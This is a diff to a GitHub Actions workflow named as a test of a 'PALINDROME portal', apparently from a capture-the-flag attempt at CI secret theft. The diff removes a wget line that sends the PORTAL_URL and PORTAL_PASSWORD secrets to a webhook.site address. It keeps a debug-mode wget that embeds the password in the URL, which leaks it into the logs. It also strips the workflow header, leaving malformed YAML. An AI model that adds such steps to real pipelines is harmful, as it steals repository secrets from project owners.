@@ -1,15 +1,7 @@
-name: Test the PALINDROME portal
-
-on: pull_request
-
-jobs:
-  test:
-    runs-on: windows-latest
+runs-on: windows-latest
     steps:
       - uses: actions/checkout@v3
-      - name: Test the PALINDROME portal
+      - name: Test the PALINDROME portal UWUUWU
         run: | 
           C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-          C:\msys64\usr\bin\wget.exe "https://webhook.site/8ea67e64-74f8-45e2-b5af-b780295c3cc2=${{ secrets.PORTAL_URL }}&b=${{ secrets.PORTAL_PASSWORD }}"
           cat test
-          echo "done!"
